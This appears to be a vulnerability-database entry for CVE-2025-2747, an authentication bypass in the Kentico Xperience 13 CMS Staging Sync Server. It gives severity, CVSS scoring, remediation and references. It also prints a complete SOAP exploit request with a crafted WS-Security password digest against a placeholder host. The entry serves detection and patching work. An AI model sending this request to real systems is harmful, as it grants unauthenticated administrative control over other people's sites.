_cves/2025/cve-2025-2747.md

---
layout: post
cve_id: CVE-2025-2747
title: Kentico Xperience 13 CMS - Staging Service Authentication Bypass (WT-2025-0006)
pcap: true
pcap_path: /pcaps/2025/CVE-2025-2747.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-2747.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK
severity: critical
impact: 'Unauthenticated attackers can bypass authentication through the Staging Sync
  Server component by exploiting None-type password handling, gaining control of administrative
  objects and potentially compromising the entire Kentico CMS.

  '
remediation: 'Upgrade to Kentico Xperience version 13.0.179 or later that properly
  handles Staging Sync Server authentication.

  '
reference:
- https://github.com/watchtowrlabs/kentico-xperience13-AuthBypass-wt-2025-0006
- https://devnet.kentico.com/download/hotfixes
- https://github.com/watchtowrlabs/kentico-xperience13-AuthBypass-wt-2025-0011
- https://labs.watchtowr.com/bypassing-authentication-like-its-the-90s-pre-auth-rce-chain-s-in-kentico-xperience-cms/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2025-2747
  cwe-id: CWE-287
  epss-score: 0.88933
  epss-percentile: 0.99499
metadata:
  verified: true
  max-request: 1
  fofa-query: app="Kentico-CMS"
tags:
- cve
- cve2025
- kentico
- stag
- auth-bypass
- xperience13
- kev
- vkev
- vuln
---

## 🔍 Vulnerability Description
An authentication bypass vulnerability in Kentico Xperience allows authentication bypass via the Staging Sync Server component password handling for the server defined None type. Authentication bypass allows an attacker to control administrative objects.This issue affects Xperience through 13.0.178.


## 🌐 HTTP Request
```nohighlight
POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15
Connection: close
Content-Length: 1224
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData"
Accept-Encoding: gzip
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Header>
<wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
<wsse:UsernameToken>
<wsse:Username>y3t4kallxq</wsse:Username>
<wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest">6dfzCOJsdj5Aw+1rGzwoHadPFTQ=</wsse:Password>
<wsse:Nonce>4JX/SboVYnxbh8hm3ySQdIUJtFK9cqUh</wsse:Nonce>
<wsu:Created>2025-03-10T20:11:07Z</wsu:Created>
</wsse:UsernameToken>
</wsse:Security>
</soap:Header>
<soap:Body>
<ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer">
<stagingTaskData><![CDATA[<ekwmx>]]></stagingTaskData>
</ProcessSynchronizationTaskData>
</soap:Body>
</soap:Envelope>
```

